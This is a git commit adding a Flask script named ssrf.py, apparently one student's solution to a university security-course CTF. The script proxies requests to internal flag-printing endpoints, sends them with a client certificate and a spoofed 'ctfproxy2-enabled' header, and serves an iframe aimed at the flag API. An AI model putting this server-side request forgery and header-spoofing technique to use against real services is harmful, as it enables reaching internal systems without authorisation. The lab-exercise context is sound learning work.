3b286e9d164add216042787b4751d4b3a39f7938
Jacky <gokurohono@gmail.com>
2021-08-02 01:36:07 +1000

    a

---
+++ week8/ctfproxy2/ssrf.py
@@ -0,0 +1,47 @@
+from flask import Flask, jsonify
+import json
+import requests
+
+
+app = Flask(__name__)
+
+@app.route('/', methods=['GET'])
+def a():
+    cert = ('/Users/jackyxie/documents/term2/6843/cert/6843.pem', '/Users/jackyxie/documents/term2/6843/cert/6843.key')
+    req = requests.get('https://ctfproxy2.quoccabank.com/api/flagprinter-v2', cert=cert)
+    try:
+        print(req.text)
+        print(req.headers)
+        resp = jsonify(req.text)
+        resp.headers.add('content-type', 'text/html')
+        resp.headers.add('ctfproxy2-enabled', 1)
+        return resp
+
+    except:
+        return json.dumps({})
+
+@app.route('/internal', methods=['GET'])
+def b():
+    cert = ('/Users/jackyxie/documents/term2/6843/cert/6843.pem', '/Users/jackyxie/documents/term2/6843/cert/6843.key')
+    req = requests.get('https://flagprinter-v2.quoccabank.com/', cert=cert)
+    try:
+        print(req.text)
+        print(req.headers)
+        resp = jsonify(req.text)
+        resp.headers.add('content-type', 'text/html')
+        resp.headers.add('ctfproxy2-enabled', 1)
+        return resp
+
+    except:
+        return json.dumps({})
+
+@app.route('/iframe', methods=['GET'])
+def c():
+    body='<!doctype html><html><body><iframe src=api/flagprinter-v2/></body></html>'
+    resp=jsonify(body)
+    resp.headers.add('content-type', 'text/html; charset=UTF-8')
+    resp.headers.add('ctfproxy2-enabled', 1)
+    return resp
+
+if __name__ == '__main__':
+    app.run(port=4444)
